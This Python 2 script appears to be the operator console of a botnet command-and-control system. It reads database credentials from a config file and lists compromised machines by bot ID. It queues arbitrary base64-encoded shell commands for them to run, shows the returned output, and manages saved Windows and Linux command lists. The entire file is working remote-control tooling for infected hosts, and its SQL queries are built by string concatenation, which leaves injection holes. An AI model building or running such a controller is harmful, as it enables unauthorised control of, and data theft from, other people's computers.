#!/usr/bin/python

import MySQLdb
import sys
import base64
import ConfigParser
import time

# Need to be able to remove commands from bot in the event they do not execute...


def printSeperator(title):
    print
    print "#" * 85
    print "### " + title
    print


def sendCommand(botID, osT, c, db):
    printSeperator("Send Command to machineID: " + botID)
    selection = raw_input("$ ")
    encodedSelection = base64.b64encode(selection)
    if len(selection) > 1:
        sql = "INSERT INTO botInfo (machineID, osType, httpCommand, executed) VALUES ('" + botID + "','" + osT + "','" + encodedSelection + "','N')"
        c.execute(sql)
        db.commit()
    controlBot(botID, c, db)


def displayResults(actionID, c, db):
    sql = "SELECT id, machineID, osType, httpCommand, httpResults, executed FROM botInfo WHERE id=" + str(actionID)
    c.execute(sql)
    db.commit()
    if (c.rowcount > 0):
        for row in c.fetchall():
            id = actionID
            botID = row[1]
            osType = row[2]
            httpCommand = base64.b64decode(row[3])
            executed = row[5]
            printSeperator("Display Results for Action ID: " + str(id))
            print "BotID: " + botID + " OS Type: " + osType
            if executed == 'Y':
                httpResults = base64.b64decode(row[4])
                print "Command Executed: " + httpCommand
                print
                print httpResults
                print
            else:
                print "Command is Pending: " + httpCommand
                print
        raw_input("Press any key to continue...")

def selectCommand(machineID, cur, db, osType):
    print
    print "Testing"
    print

def addCommand(txtFile, osType):
    printSeperator("List of Current " + osType + " Commands in File")
    f = open(txtFile, "r")
    for line in f:
        print line.strip()
    f.close()
    print
    newCommand = raw_input("New command to insert: ")
    print
    response = raw_input("Insert the new command of '" + newCommand + "'? (Y/N) ")
    if response == 'Y' or response == 'y':
        f = open(txtFile, "a")
        f.write(newCommand + "\r\n")
        f.close()

def showCommand(txtFile, osType):
    printSeperator("List of " + osType + " Commands")
    f = open(txtFile, "r")
    for line in f:
        print line.strip()
    f.close()
    print

def removeCommand(txtFile, osType):
    printSeperator("Remove the Following " + osType + " Selected Command")
    commandList = []
    commandListNumb = []
    f = open(txtFile, "r")
    counter = 0
    for line in f:
        commandList.append(line.strip())
        commandListNumb.append(counter)
        counter += 1
    f.close()
    for i in range(0, len(commandList)):
        print str(i) + ". " + commandList[i]
    response = raw_input("Remove the command: ")
    f = open(txtFile, "w")
    for i in range(0, len(commandList)):
        if not i == int(response):
            f.write(commandList[i] + "\r\n")
    f.close()


def controlBot(botID, cur, db):
    while True:
        sql = "SELECT id, osType, httpCommand, executed FROM botInfo WHERE machineID='" + botID + "'"
        cur.execute(sql)
        db.commit()
        if (cur.rowcount > 0):
            printSeperator("Command History for BotID: " + botID)
            print "Select the number preceeding the command to view the results of the command."
            print
            idList = []
            for row in cur.fetchall():
                id = row[0]
                idList.append(row[0])
                machineID = botID
                osType = row[1]
                httpCommand = base64.b64decode(row[2])
                executed = row[3]
                print str(id) + ": Results Exist: " + executed + " Command: " + httpCommand
            print
            print "I. Issue New Command to Bot"
            print "L. Select Command from List"
            print "R. Refresh"
            print "Q. Return to Main"
            selection = raw_input("$ ")
            if (selection == 'I') | (selection == 'i'):
                sendCommand(machineID, osType, cur, db)
            elif (selection == 'L') | (selection == 'l'):
                if osType == 'nt':
                    selectCommand(machineID, cur, db, osType)
                else:
                    selectCommand(machineID, cur, db, osType)
            elif (selection == 'Q') | (selection == 'q'):
                main()
            else:
                try:
                    val = int(selection)
                    if val in idList:
                        displayResults(selection, cur, db)
                    else:
                        continue
                except:
                    continue
        else:
            print "Invalid numerical selection."
            break

def manageLists(winFile, linuxFile):
    while True:
        printSeperator("Manage Lists")
        print
        print "A. Add Windows Command to List"
        print "B. Show Windows Commands in List"
        print "C. Remove Windows Command from List"
        print "M. Add Linux Command to List"
        print "N. Show Linux Commands in List"
        print "O. Remove Linux Command from List"
        print "Q. Go Back to Main Menu"
        selection = raw_input("$ ")
        if (selection == 'Q') | (selection == 'q'):
            main()
        elif (selection == 'A') | (selection == 'a'):
            addCommand(winFile, "nt")
        elif (selection == 'B') | (selection == 'b'):
            showCommand(winFile, "nt")
        elif (selection == 'C') | (selection == 'c'):
            removeCommand(winFile, "nt")
        elif (selection == 'M') | (selection == 'm'):
            addCommand(linuxFile, "posix")
        elif (selection == 'N') | (selection == 'n'):
            showCommand(linuxFile, "posix")
        elif (selection == 'O') | (selection == 'o'):
            removeCommand(linuxFile, "posix")
        else:
            continue

def main():
    global linuxCommandsFile
    global winCommandsFile
    config = ConfigParser.ConfigParser()
    config.read("config.ini")
    myHost = config.get('Database', 'dbHost')
    myUser = config.get('Database', 'dbUser')
    myPass = config.get('Database', 'dbPass')
    myDB = config.get('Database', 'dbName')
    linuxCommandsFile = config.get('Commands', 'posix')
    winCommandsFile = config.get('Commands', 'nt')
    db = MySQLdb.connect(host=myHost, passwd=myPass, user=myUser, db=myDB)
    cursor = db.cursor()
    while True:
        printSeperator("Main Menu")
        print "Select the number preceding the botID to interact with it:"
        print
        sql = "SELECT machineID, id FROM botInfo ORDER BY id DESC"
        cursor.execute(sql)
        db.commit()
        if (cursor.rowcount > 0):
            botList = []
            idList = []
            count = 0
            for row in cursor.fetchall():
                if not row[0] in botList:
                    botList.append(row[0])
                    idList.append(count)
                    count += 1
            for i in range(0, len(idList)):
                print str(i) + ". BotID:" + str(botList[i])
        print
        print "M. Manage Lists"
        print "R. Refresh"
        print "Q. Quit"
        selection = raw_input("$ ")
        if (selection == 'Q') | (selection == 'q'):
            sys.exit(0)
        elif (selection == 'R') | (selection == 'r'):
            continue
        elif (selection == 'M') | (selection == 'm'):
            manageLists(winCommandsFile, linuxCommandsFile)
        else:
            try:
                val = int(selection)
                if val in idList:
                    controlBot(botList[int(selection)], cursor, db)
                else:
                    continue
            except:
                continue
    cursor.close()
    del cursor
    db.close()


if __name__ == "__main__":
    main()
